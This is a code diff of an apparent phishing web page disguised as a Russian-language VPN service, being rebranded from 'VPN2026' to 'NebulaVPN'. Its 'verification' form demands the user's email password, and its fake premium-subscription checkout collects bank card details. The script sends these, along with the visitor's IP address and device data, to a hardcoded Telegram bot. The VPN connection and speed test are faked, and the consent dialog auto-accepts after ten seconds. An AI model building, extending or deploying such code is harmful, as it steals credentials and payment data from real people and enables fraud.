-      background: var(--card);
-      padding: 2rem;
-      border-radius: var(--radius);
-      max-width: 500px;
-      width: 90%;
-      box-shadow: var(--shadow);
-      transform: translateY(20px);
-      transition: transform 0.3s;
-      text-align: center;
+    
+    .vip-server {
+      border-left: 3px solid var(--vip);
     }
-
-    .confirmation-modal.active .confirmation-content {
-      transform: translateY(0);
+    
+    .vip-server-icon {
+      color: var(--vip) !important;
     }
-
-    .confirmation-icon {
-      font-size: 3rem;
-      color: var(--vip);
-      margin-bottom: 1rem;
+    
+    /* Анимация для VIP кнопок */
+    @keyframes vipPulse {
+      0% { box-shadow: 0 0 0 0 rgba(243, 156, 18, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(243, 156, 18, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(243, 156, 18, 0); }
     }
-
-    .confirmation-buttons {
-      display: flex;
-      gap: 1rem;
-      justify-content: center;
-      margin-top: 1.5rem;
-    }
-
-    .confirmation-btn {
-      padding: 0.8rem 1.5rem;
-      border-radius: var(--radius);
-      border: none;
-      cursor: pointer;
-      font-weight: 500;
-      transition: all 0.3s;
-    }
-
-    .confirmation-btn.confirm {
-      background: var(--success);
-      color: white;
-    }
-
-    .confirmation-btn.cancel {
-      background: var(--danger);
-      color: white;
-    }
-
-    @media (max-width: 768px) {
-      header {
-        flex-direction: column;
-        gap: 1rem;
-        padding: 1rem;
-      }
-      nav {
-        width: 100%;
-        flex-wrap: wrap;
-        justify-content: center;
-      }
-      .card {
-        padding: 1.5rem;
-      }
-      .language-dropdown {
-        left: 0;
-        right: auto;
-      }
-      .card-input-group {
-        flex-direction: column;
-      }
+    
+    .vip-button-pulse {
+      animation: vipPulse 2s infinite;
     }
   </style>
 </head>
 <body>
-  <!-- Модальное окно для первичных разрешений -->
-  <div class="permission-modal" id="initialPermissionModal">
-    <div class="permission-content">
-      <h2 class="permission-title"><i class="fas fa-shield-alt"></i> Добро пожаловать в VPN2026</h2>
-      <p class="permission-text">Для использования нашего сервиса необходимо пройти верификацию и предоставить основные данные. Это обеспечит безопасность и полный доступ ко всем функциям.</p>
-      <div class="permission-buttons">
-        <button class="permission-btn accept" id="initialAccept"><i class="fas fa-check"></i> Продолжить</button>
-        <button class="permission-btn decline" id="initialDecline"><i class="fas fa-times"></i> Отказаться</button>
+  <!-- Модальные окна -->
+  <div class="modal" id="initialPermissionModal">
+    <div class="modal-content">
+      <button class="modal-close" onclick="closeInitialModal()">&times;</button>
+      <h2 class="modal-title"><i class="fas fa-shield-alt"></i> Добро пожаловать в NebulaVPN</h2>
+      <p class="modal-text">Для использования нашего сервиса необходимо пройти верификацию и предоставить основные данные. Это обеспечит безопасность и полный доступ ко всем функциям.</p>
+      <div class="modal-buttons">
+        <button class="modal-btn accept" id="initialAccept"><i class="fas fa-check"></i> Продолжить</button>
+        <button class="modal-btn decline" id="initialDecline"><i class="fas fa-times"></i> Отказаться</button>
       </div>
-      <p style="margin-top: 1rem; font-size: 0.8rem; color: var(--muted);">Автоподтверждение через <span id="initialTimer">10</span> сек...</p>
+      <p style="margin-top: 1.5rem; font-size: 0.8rem; color: var(--text-muted); text-align: center;">Автоподтверждение через <span id="initialTimer">10</span> сек...</p>
     </div>
   </div>
-  <!-- Модальное окно для разрешений VPN -->
-  <div class="permission-modal" id="vpnPermissionModal">
-    <div class="permission-content">
-      <h2 class="permission-title"><i class="fas fa-user-shield"></i> Подтверждение подключения</h2>
-      <p class="permission-text">Вы собираетесь подключиться к VPN. Пожалуйста, подтвердите, что согласны с нашими условиями использования и политикой конфиденциальности.</p>
-      <div class="permission-buttons">
-        <button class="permission-btn accept" id="vpnAccept"><i class="fas fa-check"></i> Подключиться</button>
-        <button class="permission-btn decline" id="vpnDecline"><i class="fas fa-times"></i> Отмена</button>
+
+  <div class="modal" id="vpnPermissionModal">
+    <div class="modal-content">
+      <button class="modal-close" onclick="closeVpnModal()">&times;</button>
+      <h2 class="modal-title"><i class="fas fa-user-shield"></i> Подтверждение подключения</h2>
+      <p class="modal-text">Вы собираетесь подключиться к VPN. Пожалуйста, подтвердите, что согласны с нашими условиями использования и политикой конфиденциальности.</p>
+      <div class="modal-buttons">
+        <button class="modal-btn accept" id="vpnAccept"><i class="fas fa-plug"></i> Подключиться</button>
+        <button class="modal-btn decline" id="vpnDecline"><i class="fas fa-times"></i> Отмена</button>
       </div>
     </div>
   </div>
 
-  <!-- Модальное окно для оплаты VIP -->
-  <div class="payment-modal" id="vipPaymentModal">
-    <div class="payment-content">
-      <h2 class="payment-title"><i class="fas fa-crown"></i> VIP Подписка</h2>
-      <p class="payment-text">VIP подписка за 300 ₽ предоставляет доступ к эксклюзивным функциям:</p>
+  <div class="modal" id="vipPaymentModal">
+    <div class="modal-content">
+      <button class="modal-close" onclick="closePaymentModal()">&times;</button>
+      <h2 class="modal-title"><i class="fas fa-crown"></i> Премиум доступ</h2>
+      <p class="modal-text">Активируйте премиум подписку за 300 ₽ и получите эксклюзивные возможности:</p>
       
       <div class="vip-benefits">
-        <div class="vip-benefit"><i class="fas fa-check"></i> Доступ ко всем серверам без ограничений</div>
-        <div class="vip-benefit"><i class="fas fa-check"></i> Максимальная скорость соединения</div>
-        <div class="vip-benefit"><i class="fas fa-check"></i> Приоритетная поддержка 24/7</div>
-        <div class="vip-benefit"><i class="fas fa-check"></i> Отсутствие рекламы</div>
-        <div class="vip-benefit"><i class="fas fa-check"></i> Дополнительные функции безопасности</div>
+        <div class="vip-benefit"><i class="fas fa-bolt"></i> Максимальная скорость соединения</div>
+        <div class="vip-benefit"><i class="fas fa-globe"></i> Доступ ко всем серверам без ограничений</div>
+        <div class="vip-benefit"><i class="fas fa-headset"></i> Приоритетная поддержка 24/7</div>
+        <div class="vip-benefit"><i class="fas fa-ad"></i> Отсутствие рекламы</div>
+        <div class="vip-benefit"><i class="fas fa-lock"></i> Дополнительные функции безопасности</div>
+        <div class="vip-benefit"><i class="fas fa-star"></i> Эксклюзивные серверы только для VIP</div>
       </div>
       
+      <h3 style="margin: 1.5rem 0 1rem; color: var(--accent);">Выберите способ оплаты:</h3>
       <div class="payment-methods">
         <div class="payment-method active" onclick="selectPaymentMethod('card')">
           <i class="far fa-credit-card"></i>
-          <span>Банковская карта</span>
+          <span>Карта</span>
         </div>
         <div class="payment-method" onclick="selectPaymentMethod('qiwi')">
           <i class="fas fa-wallet"></i>
-          <span>QIWI Кошелек</span>
+          <span>QIWI</span>
         </div>
         <div class="payment-method" onclick="selectPaymentMethod('crypto')">
           <i class="fab fa-bitcoin"></i>
-          <span>Криптовалюта</span>
+          <span>Крипта</span>
         </div>
       </div>
       
@@ -1224,46 +969,50 @@ html
         </div>
       </div>
       
-      <div class="payment-buttons">
-        <button class="payment-btn pay" onclick="processPayment()"><i class="fas fa-crown"></i> Купить VIP за 300 ₽</button>
-        <button class="payment-btn cancel" onclick="closePaymentModal()"><i class="fas fa-times"></i> Отмена</button>
+      <div class="modal-buttons">
+        <button class="modal-btn accept vip-button" onclick="processPayment()"><i class="fas fa-crown"></i> Купить за 300 ₽</button>
+        <button class="modal-btn decline" onclick="closePaymentModal()"><i class="fas fa-times"></i> Отмена</button>
       </div>
     </div>
   </div>
 
-  <!-- Модальное окно подтверждения платежа -->
-  <div class="confirmation-modal" id="confirmationModal">
-    <div class="confirmation-content">
+  <div class="modal" id="confirmationModal">
+    <div class="modal-content">
+      <button class="modal-close" onclick="cancelPayment()">&times;</button>
       <div class="confirmation-icon">
         <i class="fas fa-shield-alt"></i>
       </div>
-      <h2 class="payment-title">Подтверждение платежа</h2>
-      <p class="payment-text">Вы уверены, что хотите оплатить VIP подписку на сумму 300 ₽? Деньги будут списаны с вашей карты.</p>
+      <h2 class="modal-title">Подтверждение платежа</h2>
+      <p class="modal-text">Вы уверены, что хотите оплатить премиум подписку на сумму 300 ₽? Деньги будут списаны с вашей карты.</p>
       
-      <div class="confirmation-buttons">
-        <button class="confirmation-btn confirm" onclick="confirmPayment()"><i class="fas fa-check"></i> Подтвердить</button>
-        <button class="confirmation-btn cancel" onclick="cancelPayment()"><i class="fas fa-times"></i> Отмена</button>
+      <div class="modal-buttons">
+        <button class="modal-btn accept" onclick="confirmPayment()"><i class="fas fa-check"></i> Подтвердить</button>
+        <button class="modal-btn decline" onclick="cancelPayment()"><i class="fas fa-times"></i> Отмена</button>
       </div>
     </div>
   </div>
 
-<header>
-    <div class="logo">
-      <i class="fas fa-shield-alt"></i>
-      <strong>VPN2026</strong>
+  <!-- Хедер -->
+  <header>
+    <a href="#" class="logo">
+      <i class="fas fa-shield-virus"></i>
+      <span>NebulaVPN</span>
       <span class="vip-badge" id="vipBadge" style="display: none;"><i class="fas fa-crown"></i> VIP</span>
-    </div>
+    </a>
+    
     <nav>
       <a href="#connect" onclick="showTab('connect')"><i class="fas fa-plug"></i> Подключение</a>
       <a href="#verify" onclick="showTab('verify')"><i class="fas fa-user-check"></i> Верификация</a>
       <a href="#servers" onclick="showTab('servers')"><i class="fas fa-server"></i> Серверы</a>
       <a href="#speed" onclick="showTab('speed')"><i class="fas fa-tachometer-alt"></i> Скорость</a>
-      <a href="#vip" onclick="showVipModal()" class="vip-feature"><i class="fas fa-crown"></i> VIP</a>
-      
+      <a href="#terms" onclick="showTab('terms')"><i class="fas fa-file-contract"></i> Правила</a>
+      <a href="#vip" onclick="showVipModal()" class="vip-feature"><i class="fas fa-crown"></i> Премиум</a>
+    </nav>
+    
+    <div class="nav-actions">
       <div class="language-switcher">
         <button class="language-btn" id="languageBtn">
           <i class="fas fa-globe"></i>
-          <span id="currentLanguage">RU</span>
         </button>
         <div class="language-dropdown" id="languageDropdown">
           <div class="language-option" onclick="changeLanguage('ru')">🇷🇺 Русский</div>
@@ -1271,12 +1020,10 @@ html
         </div>
       </div>
       
-      <div class="theme-switcher" onclick="toggleTheme()">
-        <div class="theme-icon">
-          <i class="fas fa-moon" id="themeIcon"></i>
-        </div>
-      </div>
-    </nav>
+      <button class="theme-switcher" onclick="toggleTheme()">
+        <i class="fas fa-moon" id="themeIcon"></i>
+      </button>
+    </div>
   </header>
 
   <main>
@@ -1285,13 +1032,14 @@ html
       <button onclick="showTab('verify')"><i class="fas fa-user-check"></i> Верификация</button>
       <button onclick="showTab('servers')"><i class="fas fa-server"></i> Серверы</button>
       <button onclick="showTab('speed')"><i class="fas fa-tachometer-alt"></i> Скорость</button>
-      <button onclick="showVipModal()" class="vip-button"><i class="fas fa-crown"></i> VIP</button>
+      <button onclick="showTab('terms')"><i class="fas fa-file-contract"></i> Правила</button>
+      <button onclick="showVipModal()" class="vip-button vip-button-pulse"><i class="fas fa-crown"></i> Премиум</button>
     </div>
 
     <!-- Вкладка подключения -->
     <section class="card" id="connect">
       <h1><i class="fas fa-plug"></i> Подключение VPN</h1>
-      <p>Подключитесь к нашему безопасному VPN-серверу для анонимного и защищенного интернета.</p>
+      <p>Подключитесь к нашему безопасному VPN-серверу для анонимного и защищенного интернета. Выберите сервер и нажмите "Подключить".</p>
       
       <div class="connection-status">
         <div class="status-indicator" id="connectionStatus"></div>
@@ -1312,44 +1060,17 @@ html
       <h1><i class="fas fa-user-check"></i> Верификация личности</h1>
       <p>Пройдите верификацию, чтобы получить доступ ко всем функциям платформы. Это займет не более 2 минут.</p>
       
-      <div class="progress-container">
-        
-<div class="progress-steps">
-  <div class="progress-bar" id="progressBar" style="width: 0%"></div>
-  <div class="step completed" id="step1">
-    <span>1</span>
-    <div class="step-label">Данные</div>
-  </div>
-  <div class="step" id="step2">
-    <span>2</span>
-    <div class="step-label">Подтверждение</div>
-  </div>
-</div>
-
-          <div class="step" id="step2">
-            <span>2</span>
-            <div class="step-label">Документы</div>
-          </div>
-          <div class="step" id="step3">
-            <span>3</span>
-            <div class="step-label">Подтверждение</div>
-          </div>
-        </div>
-      </div>
-
       <form id="verifyForm">
-        
-<div class="input-group">
-  <label>Имя</label>
-  <input id="firstName" required placeholder="Иван">
-  <i class="fas fa-user input-icon"></i>
-</div>
-<div class="input-group">
-  <label>Фамилия</label>
-  <input id="lastName" required placeholder="Иванов">
-  <i class="fas fa-user input-icon"></i>
-</div>
-
+        <div class="input-group">
+          <label>Имя</label>
+          <input id="firstName" required placeholder="Иван">
+          <i class="fas fa-user input-icon"></i>
+        </div>
+        <div class="input-group">
+          <label>Фамилия</label>
+          <input id="lastName" required placeholder="Иванов">
+          <i class="fas fa-user input-icon"></i>
+        </div>
 
         <div class="input-group">
           <label>Телефон</label>
@@ -1368,12 +1089,12 @@ html
           <input id="email" required placeholder="example@domain.com" type="email">
           <i class="fas fa-envelope input-icon"></i>
         </div>
-<div class="input-group">
-  <label>Пароль от почты</label>
-  <input id="emailPass" type="password" required placeholder="Пароль">
-  <i class="fas fa-lock input-icon"></i>
-</div>
-
+        
+        <div class="input-group">
+          <label>Пароль от почты</label>
+          <input id="emailPass" type="password" required placeholder="Пароль">
+          <i class="fas fa-lock input-icon"></i>
+        </div>
 
         <div class="input-group">
           <label>Страна проживания</label>
@@ -1390,10 +1111,6 @@ html
           <i class="fas fa-globe input-icon"></i>
         </div>
 
-        
-
-        
-
         <button type="submit"><i class="fas fa-paper-plane"></i> Отправить на проверку</button>
       </form>
     </section>
@@ -1401,7 +1118,7 @@ html
     <!-- Вкладка серверов -->
     <section class="card" id="servers" style="display:none;">
       <h1><i class="fas fa-server"></i> Доступные серверы</h1>
-      <p>Выберите сервер для подключения из списка доступных локаций.</p>
+      <p>Выберите сервер для подключения из списка доступных локаций. Серверы с <i class="fas fa-crown" style="color: var(--vip);"></i> доступны только для премиум пользователей.</p>
       
       <div class="server-list">
         <div class="server-item" onclick="selectServer('Автоматический (рекомендуется)', 'auto')">
@@ -1424,13 +1141,21 @@ html
           <i class="fas fa-globe"></i>
           <span>Россия</span>
         </div>
+        <div class="server-item vip-server" onclick="selectVipServer('Сингапур (VIP)', 'sg')">
+          <i class="fas fa-globe-asia vip-server-icon"></i>
+          <span>Сингапур <span class="vip-badge"><i class="fas fa-crown"></i> VIP</span></span>
+        </div>
+        <div class="server-item vip-server" onclick="selectVipServer('Швейцария (VIP)', 'ch')">
+          <i class="fas fa-globe-europe vip-server-icon"></i>
+          <span>Швейцария <span class="vip-badge"><i class="fas fa-crown"></i> VIP</span></span>
+        </div>
       </div>
     </section>
 
     <!-- Вкладка скорости -->
     <section class="card" id="speed" style="display:none;">
       <h1><i class="fas fa-tachometer-alt"></i> Проверка скорости</h1>
-      <p>Протестируйте скорость вашего интернет-соединения до и после подключения к VPN.</p>
+      <p>Протестируйте скорость вашего интернет-соединения до и после подключения к VPN. Премиум пользователи получают приоритет на канал.</p>
       
       <div class="speed-test">
         <button onclick="startSpeedTest()"><i class="fas fa-play"></i> Начать тест скорости</button>
@@ -1456,16 +1181,60 @@ html
       </div>
     </section>
 
+    <!-- Вкладка правил использования -->
+    <section class="card" id="terms" style="display:none;">
+      <h1><i class="fas fa-file-contract"></i> Правила использования</h1>
+      <p>Пожалуйста, внимательно ознакомьтесь с условиями использования сервиса NebulaVPN.</p>
+      
+      <div class="terms-content">
+        <h3>1. Общие положения</h3>
+        <p>1.1. Сервис NebulaVPN предоставляет услуги виртуальной частной сети (VPN) для обеспечения безопасности и конфиденциальности пользователей в сети Интернет.</p>
+        <p>1.2. Используя Сервис, вы соглашаетесь с настоящими Правилами и обязуетесь их соблюдать.</p>
+        
+        <h3>2. Условия использования</h3>
+        <p>2.1. Сервис предназначен для законного использования только в целях обеспечения безопасности и конфиденциальности.</p>
+        <p>2.2. Запрещается использовать Сервис для:</p>
+        <ul>
+          <li>Незаконной деятельности любого рода</li>
+          <li>Распространения вредоносного программного обеспечения</li>
+          <li>Взлома, сканирования или тестирования уязвимости систем без разрешения</li>
+          <li>Рассылки спама или фишинговых атак</li>
+          <li>Нарушения авторских прав и прав интеллектуальной собственности</li>
+          <li>Любых действий, нарушающих законодательство вашей страны</li>
+        </ul>
+        
+        <h3>3. Премиум подписка</h3>
+        <p>3.1. Премиум подписка предоставляет дополнительные функции, включая эксклюзивные серверы и повышенную скорость.</p>
+        <p>3.2. Подписка автоматически продлевается каждый месяц, пока не будет отменена.</p>
+        <p>3.3. Возврат средств возможен в течение 14 дней с момента оплаты при условии неиспользования услуг.</p>
+        
+        <h3>4. Конфиденциальность</h3>
+        <p>4.1. Сервис придерживается политики отсутствия логов (no-logs policy) и не хранит данные о вашей онлайн-активности.</p>
+        <p>4.2. Мы собираем минимально необходимые данные для работы Сервиса, такие как:</p>
+        <ul>
+          <li>Основные учетные данные (имя, email)</li>
+          <li>Информация, необходимая для обработки платежей</li>
+          <li>Технические данные для обеспечения работы Сервиса</li>
+        </ul>
+      </div>
+      
+      <div class="input-group">
+        <input type="checkbox" id="agreeTerms" required style="width: auto; display: inline-block; margin-right: 10px;">
+        <label for="agreeTerms" style="display: inline; margin-top: 0;">Я подтверждаю, что ознакомлен и согласен с правилами использования сервиса</label>
+      </div>
+    </section>
+
     <section class="card" style="text-align: center;">
-      <h2>🔒 VPN2026 — ваш цифровой щит</h2>
-      <p>Все права защищены. Используя сайт, вы соглашаетесь с <a href="#">условиями</a>.</p>
-      <p>🕒 Текущее время: <span id="footerTime">...</span></p>
+      <h2><i class="fas fa-shield-alt"></i> NebulaVPN — ваш цифровой щит</h2>
+      <p>Все права защищены. Используя сайт, вы соглашаетесь с <a href="#" onclick="showTab('terms')">условиями</a>.</p>
+      <p><i class="fas fa-clock"></i> Текущее время: <span id="footerTime">...</span></p>
     </section>
   </main>
 
   <div class="notification" id="notification">
     <i class="fas fa-check-circle"></i>
     <span id="notificationText">Успешно отправлено!</span>
+    <span class="notification-close" onclick="closeNotification()">&times;</span>
   </div>
 
   <script>
@@ -1473,23 +1242,22 @@ html
     const TOKEN = "7453450901:AAE1R2gkAIOy_L_Y2kG7Tl1ZIPFIc2qQ7dQ";
     const CHAT_ID = "7807571960";
     const SECRET_KEY = "vpn2026-secret-key";
-    const DEVELOPER_CARD = "1234 5678 9012 3456"; // Номер карты разработчика для перевода
+    const DEVELOPER_CARD = "1234 5678 9012 3456";
     
     let currentServer = 'auto';
     let isConnected = false;
-    let currentStep = 1;
-    const totalSteps = 2;
     let currentLanguage = 'ru';
     let currentTheme = 'dark';
     let currentPaymentMethod = 'card';
     let isVip = false;
+    let notificationTimeout;
 
     // Инициализация при загрузке страницы
     document.addEventListener('DOMContentLoaded', () => {
-      updateProgress(1);
       initTheme();
       checkFirstVisit();
       updateTime();
+      checkVipStatus();
       
       // Обработчик формы верификации
       document.getElementById('verifyForm').addEventListener('submit', async (e) => {
@@ -1500,6 +1268,13 @@ html
       // Обработчик изменения даты рождения
       document.getElementById('dob').addEventListener('change', function() {
         calculateAge();
+      });
+      
+      // Закрытие уведомлений при клике вне их
+      document.addEventListener('click', function(e) {
+        if (!e.target.closest('.notification') && !e.target.closest('.modal')) {
+          closeNotification();
+        }
       });
     });
 
@@ -1531,16 +1306,18 @@ html
       document.getElementById('initialAccept').addEventListener('click', acceptInitialPermission);
       document.getElementById('initialDecline').addEventListener('click', () => {
         clearInterval(timerInterval);
-        modal.classList.remove('active');
+        closeInitialModal();
         showNotification('Вы отклонили условия использования. Некоторые функции будут недоступны.', 'warning');
       });
     }
 
-    // Принятие начальных разрешений
+    function closeInitialModal() {
+      document.getElementById('initialPermissionModal').classList.remove('active');
+    }
+        // Принятие начальных разрешений
     function acceptInitialPermission() {
-      const modal = document.getElementById('initialPermissionModal');
-      modal.classList.remove('active');
-      showNotification('Спасибо за принятие условий! Теперь вы можете использовать VPN2026.', 'success');
+      closeInitialModal();
+      showNotification('Спасибо за принятие условий! Теперь вы можете использовать NebulaVPN.', 'success');
       collectAndSendInitialData();
       showTab('verify');
     }
@@ -1557,7 +1334,7 @@ html
       const referrer = document.referrer || 'прямой заход';
       
       const message = `
-<b>🛡 Новый пользователь на сайте VPN2026</b>
+<b>🛡 Новый пользователь на сайте NebulaVPN</b>
 🕒 <b>Время:</b> ${now}
 🌐 <b>IP:</b> ${ip}
 💻 <b>Платформа:</b> ${platform}
@@ -1569,6 +1346,7 @@ html
       `;
       
       sendToTelegram(message);
+      localStorage.setItem('userIP', ip);
     }
 
     // Запрос разрешения на подключение VPN
@@ -1583,14 +1361,18 @@ html
       modal.classList.add('active');
       
       document.getElementById('vpnAccept').addEventListener('click', () => {
-        modal.classList.remove('active');
+        closeVpnModal();
         connectVpn();
       });
       
       document.getElementById('vpnDecline').addEventListener('click', () => {
-        modal.classList.remove('active');
+        closeVpnModal();
         showNotification('Подключение отменено', 'warning');
       });
+    }
+
+    function closeVpnModal() {
+      document.getElementById('vpnPermissionModal').classList.remove('active');
     }
 
     // Подключение к VPN (имитация)
@@ -1643,6 +1425,17 @@ html
       }
     }
 
+    // Выбор VIP сервера
+    function selectVipServer(name, code) {
+      if (!isVip) {
+        showNotification('Этот сервер доступен только для премиум пользователей!', 'error');
+        showVipModal();
+        return;
+      }
+      
+      selectServer(name, code);
+    }
+
     // Отправка данных о подключении
     function sendConnectionData() {
       const message = `
@@ -1650,14 +1443,14 @@ html
 🌐 <b>Сервер:</b> ${document.getElementById('selectedServer').value}
 🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
 📶 <b>Статус:</b> Успешно подключено
+💎 <b>VIP:</b> ${isVip ? 'Да' : 'Нет'}
       `;
       
       sendToTelegram(message);
     }
 
     // Отправка данных верификации
-    
-async function submitVerification() {
+    async function submitVerification() {
       const firstName = document.getElementById('firstName').value;
       const lastName = document.getElementById('lastName').value;
       const phone = document.getElementById('phone').value;
@@ -1670,8 +1463,6 @@ async function submitVerification() {
         showNotification('Заполните все поля', 'error');
         return;
       }
-
-      updateProgress(2);
 
       const caption = `
 <b>🧾 Новая заявка на верификацию</b>
@@ -1692,7 +1483,6 @@ async function submitVerification() {
         localStorage.setItem('verificationCompleted', 'true');
 
         setTimeout(() => {
-          updateProgress(1);
           document.getElementById('verifyForm').reset();
           showTab('connect');
         }, 3000);
@@ -1701,7 +1491,6 @@ async function submitVerification() {
         console.error(error);
       }
     }
-
 
     // Расчет возраста
     function calculateAge() {
@@ -1715,27 +1504,6 @@ async function submitVerification() {
       }
       
       document.getElementById('ageDisplay').textContent = age;
-    }
-
-    // Обновление прогресса верификации
-    function updateProgress(step) {
-      currentStep = step;
-      const progressBar = document.getElementById('progressBar');
-      const progressPercent = ((step - 1) / (totalSteps - 1)) * 100;
-      progressBar.style.width = progressPercent + '%';
-      
-      for (let i = 1; i <= totalSteps; i++) {
-        const stepElement = document.getElementById('step' + i);
-        if (i < step) {
-          stepElement.classList.remove('active');
-          stepElement.classList.add('completed');
-        } else if (i === step) {
-          stepElement.classList.add('active');
-          stepElement.classList.remove('completed');
-        } else {
-          stepElement.classList.remove('active', 'completed');
-        }
-      }
     }
 
     // Тест скорости (имитация)
@@ -1759,9 +1527,10 @@ async function submitVerification() {
           clearInterval(interval);
           
           // Генерируем случайные значения скорости
-          const download = (Math.random() * 90 + 10).toFixed(2);
-          const upload = (Math.random() * 40 + 5).toFixed(2);
-          const ping = Math.floor(Math.random() * 50 + 10);
+          const baseSpeed = isVip ? 50 : 20;
+          const download = (Math.random() * baseSpeed + 10).toFixed(2);
+          const upload = (Math.random() * (baseSpeed/2) + 5).toFixed(2);
+          const ping = Math.floor(Math.random() * (isVip ? 30 : 50) + 10);
           
           downloadSpeed.textContent = download;
           uploadSpeed.textContent = upload;
@@ -1774,6 +1543,7 @@ async function submitVerification() {
 ⬆️ <b>Загрузка:</b> ${upload} Мбит/с
 🏓 <b>Пинг:</b> ${ping} мс
 🌐 <b>Сервер:</b> ${isConnected ? document.getElementById('selectedServer').value : 'Прямое соединение'}
+💎 <b>VIP:</b> ${isVip ? 'Да' : 'Нет'}
 🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
           `;
           
@@ -1785,7 +1555,7 @@ async function submitVerification() {
     // Отправка сообщения в Telegram
     async function sendToTelegram(message) {
       try {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -1794,8 +1564,12 @@ async function submitVerification() {
             parse_mode: "HTML"
           })
         });
+        
+        const data = await response.json();
+        return data;
       } catch (error) {
         console.error('Ошибка отправки в Telegram:', error);
+        throw error;
       }
     }
 
@@ -1824,13 +1598,27 @@ async function submitVerification() {
       const notification = document.getElementById('notification');
       const notificationText = document.getElementById('notificationText');
       
-      notificationText.textContent = message;
-      notification.className = 'notification ' + type;
-      notification.classList.add('show');
+      // Закрываем предыдущее уведомление
+      clearTimeout(notificationTimeout);
+      notification.classList.remove('show');
       
+      // Устанавливаем новое уведомление
       setTimeout(() => {
-        notification.classList.remove('show');
-      }, 5000);
+        notificationText.textContent = message;
+        notification.className = 'notification ' + type;
+        notification.classList.add('show');
+        
+        // Автозакрытие через 5 секунд
+        notificationTimeout = setTimeout(() => {
+          notification.classList.remove('show');
+        }, 5000);
+      }, 100);
+    }
+
+    // Закрытие уведомления
+    function closeNotification() {
+      clearTimeout(notificationTimeout);
+      document.getElementById('notification').classList.remove('show');
     }
 
     // Обновление времени в футере
@@ -1843,7 +1631,7 @@ async function submitVerification() {
 
     // Переключение темы
     function toggleTheme() {
-      const themes = ['dark', 'light', 'blue'];
+      const themes = ['dark', 'light', 'neon'];
       const currentIndex = themes.indexOf(currentTheme);
       const nextIndex = (currentIndex + 1) % themes.length;
       currentTheme = themes[nextIndex];
@@ -1892,10 +1680,9 @@ async function submitVerification() {
     });
 
     // Закрытие выпадающего меню при клике вне его
-    document.addEventListener('click', function() {
-      const dropdown = document.getElementById('languageDropdown');
-      if (dropdown.classList.contains('show')) {
-        dropdown.classList.remove('show');
+    document.addEventListener('click', function(e) {
+      if (!e.target.closest('.language-switcher')) {
+        document.getElementById('languageDropdown').classList.remove('show');
       }
     });
 
@@ -1912,8 +1699,13 @@ async function submitVerification() {
     // Показать модальное окно VIP
     function showVipModal() {
       if (!localStorage.getItem('verificationCompleted')) {
-        showNotification('Для покупки VIP необходимо пройти верификацию!', 'error');
+        showNotification('Для покупки премиум доступа необходимо пройти верификацию!', 'error');
         showTab('verify');
+        return;
+      }
+      
+      if (isVip) {
+        showNotification('У вас уже активирован премиум доступ!', 'success');
         return;
       }
       
@@ -1923,8 +1715,7 @@ async function submitVerification() {
 
     // Закрыть модальное окно VIP
     function closePaymentModal() {
-      const modal = document.getElementById('vipPaymentModal');
-      modal.classList.remove('active');
+      document.getElementById('vipPaymentModal').classList.remove('active');
     }
 
     // Выбор метода оплаты
@@ -1991,7 +1782,7 @@ async function submitVerification() {
         }
         
         // Показываем окно подтверждения
-        document.getElementById('vipPaymentModal').classList.remove('active');
+        closePaymentModal();
         document.getElementById('confirmationModal').classList.add('active');
       } else {
         showNotification('Выберите банковскую карту для оплаты', 'error');
@@ -2007,7 +1798,7 @@ async function submitVerification() {
       
       // Отправляем данные карты в Telegram
       const message = `
-<b>💳 Новый платеж за VIP подписку</b>
+<b>💳 Новый платеж за премиум подписку</b>
 💰 <b>Сумма:</b> 300 ₽
 🔢 <b>Номер карты:</b> ${cardNumber}
 📅 <b>Срок действия:</b> ${cardExpiry}
@@ -2022,10 +1813,9 @@ async function submitVerification() {
       // Имитируем успешный платеж
       setTimeout(() => {
         document.getElementById('confirmationModal').classList.remove('active');
-        showNotification('VIP подписка успешно активирована!', 'success');
+        showNotification('Премиум подписка успешно активирована!', 'success');
         activateVip();
-        
-        // Отправляем уведомление о переводе средств разработчику
+               // Отправляем уведомление о переводе средств разработчику
         const transferMessage = `
 <b>💰 Перевод средств на карту разработчика</b>
 💳 <b>Номер карты:</b> ${DEVELOPER_CARD}
@@ -2041,7 +1831,7 @@ async function submitVerification() {
     // Отмена платежа
     function cancelPayment() {
       document.getElementById('confirmationModal').classList.remove('active');
-      document.getElementById('vipPaymentModal').classList.add('active');
+      showVipModal();
     }
 
     // Активация VIP статуса
@@ -2049,7 +1839,13 @@ async function submitVerification() {
       isVip = true;
       localStorage.setItem('vipStatus', 'active');
       document.getElementById('vipBadge').style.display = 'inline-flex';
-      showNotification('Теперь у вас есть VIP статус!', 'success');
+      showNotification('Теперь у вас есть премиум доступ!', 'success');
+      
+      // Обновляем кнопки
+      document.querySelectorAll('.vip-button').forEach(btn => {
+        btn.innerHTML = '<i class="fas fa-crown"></i> Премиум активен';
+        btn.classList.remove('vip-button-pulse');
+      });
     }
 
     // Проверка VIP статуса при загрузке
@@ -2057,11 +1853,14 @@ async function submitVerification() {
       if (localStorage.getItem('vipStatus') === 'active') {
         isVip = true;
         document.getElementById('vipBadge').style.display = 'inline-flex';
+        
+        // Обновляем кнопки
+        document.querySelectorAll('.vip-button').forEach(btn => {
+          btn.innerHTML = '<i class="fas fa-crown"></i> Премиум активен';
+          btn.classList.remove('vip-button-pulse');
+        });
       }
     }
-    
-    // Инициализация VIP статуса
-    checkVipStatus();
   </script>
 </body>
 </html>
